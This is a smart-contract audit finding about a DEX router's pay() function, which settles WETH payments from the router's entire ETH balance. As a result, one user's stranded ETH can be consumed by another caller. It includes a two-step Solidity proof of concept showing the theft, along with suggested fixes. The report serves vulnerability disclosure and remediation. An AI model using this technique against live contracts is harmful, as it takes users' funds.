### Title
Unattributed Router ETH Balance Consumed by Any Caller via `pay()` WETH Branch — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay()` function in `PeripheryPayments.sol` uses the router's **entire** native ETH balance (`address(this).balance`) to settle WETH swap payments, with no check that the ETH belongs to the current caller. Any ETH stranded on the router by a prior user is silently consumed by the next caller whose `tokenIn` is WETH, giving that caller a free (or discounted) swap at the prior user's expense.

---

### Finding Description

`PeripheryPayments.pay()` contains a WETH-specific branch:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;   // ← entire router balance, not msg.value
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

The design assumes that any ETH sitting on the router was placed there by the **current** caller in the same transaction. That assumption is wrong. ETH accumulates on the router whenever a user sends `msg.value` to any of the payable entry points (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`, `multicall`, `unwrapWETH9`, `sweepToken`, `refundETH`, `selfPermit*`) and does not subsequently call `refundETH()` to recover the surplus.

The `receive()` guard (`if (msg.sender != WETH) revert NotWETH()`) only blocks unsolicited ETH sent via the fallback; it does **not** prevent ETH from accumulating via `msg.value` in the payable functions listed above.

Because `pay()` is called from every swap settlement path — `_justPayCallback` (single-hop exact-input and exact-output), `_exactOutputIterateCallback` (multi-hop exact-output), and `MetricOmmPoolLiquidityAdder.metricOmmModifyLiquidityCallback` — the attack surface covers the entire router and liquidity-adder payment layer.

---

### Impact Explanation

**Direct loss of user principal.** User A's stranded ETH is consumed to settle User B's WETH payment. User A loses the stranded ETH; User B receives the swap output without spending any of their own WETH or ETH. The loss is bounded only by the amount of ETH stranded, which can be arbitrarily large (e.g., a user who sends 10 ETH as `msg.value` for a 0.1 ETH swap and omits `refundETH`).

The same accounting error applies to `MetricOmmPoolLiquidityAdder` when token0 or token1 of the target pool is WETH.

---

### Likelihood Explanation

- Sending a round `msg.value` larger than the exact `amountIn` is a common UX pattern (wallets and integrators often over-estimate to avoid reverts).
- Omitting `refundETH()` from a multicall, or calling the router directly without a refund step, is a realistic user mistake.
- The exploit requires no special privilege: any address can call `exactInputSingle` with `tokenIn = WETH` and `msg.value = 0` to consume whatever ETH is currently on the router.
- The exploit is repeatable across blocks as long as ETH remains stranded.

---

### Recommendation

Track the ETH contributed by the current call in transient storage at entry (e.g., store `msg.value` in a transient slot at the start of each payable entry point) and limit the WETH branch of `pay()` to that per-call budget rather than `address(this).balance`. Alternatively, enforce that `address(this).balance == 0` at the start of every swap entry point (reverting if residue exists), or automatically refund surplus ETH at the end of every payable entry point.

---

### Proof of Concept

**Step 1 — Strand ETH (User A, Transaction 1):**

```solidity
// User A sends 1 ETH but only swaps 0.5 ETH worth of WETH.
// No refundETH() call is included.
router.exactInputSingle{value: 1 ether}(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:            address(wethToken1Pool),
        tokenIn:         address(WETH),
        tokenOut:        address(token1),
        zeroForOne:      true,
        amountIn:        0.5 ether,   // only 0.5 ETH consumed by pay()
        amountOutMinimum: 0,
        recipient:       userA,
        deadline:        block.timestamp + 1,
        priceLimitX64:   0,
        extensionData:   ""
    })
);
// Router now holds 0.5 ETH belonging to User A.
```

Inside `pay()`:
- `nativeBalance = 1 ether >= value = 0.5 ether` → branch 1 fires.
- `WETH.deposit{value: 0.5 ether}()` + `WETH.transfer(pool, 0.5 ether)`.
- Remaining `0.5 ether` stays on the router.

**Step 2 — Steal ETH (User B, Transaction 2):**

```solidity
// User B sends no ETH. pay() will consume User A's 0.5 ETH.
router.exactInputSingle{value: 0}(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool:            address(wethToken1Pool),
        tokenIn:         address(WETH),
        tokenOut:        address(token1),
        zeroForOne:      true,
        amountIn:        0.5 ether,
        amountOutMinimum: 0,
        recipient:       userB,
        deadline:        block.timestamp + 1,
        priceLimitX64:   0,
        extensionData:   ""
    })
);
// pay() sees nativeBalance = 0.5 ether >= value = 0.5 ether.
// Deposits User A's 0.5 ETH as WETH and sends to pool.
// User B's WETH allowance is never touched.
// User A's 0.5 ETH is gone.
```

**Result:** User A loses 0.5 ETH; User B receives `token1` output without spending any of their own funds. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L170-178)
```text
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
```
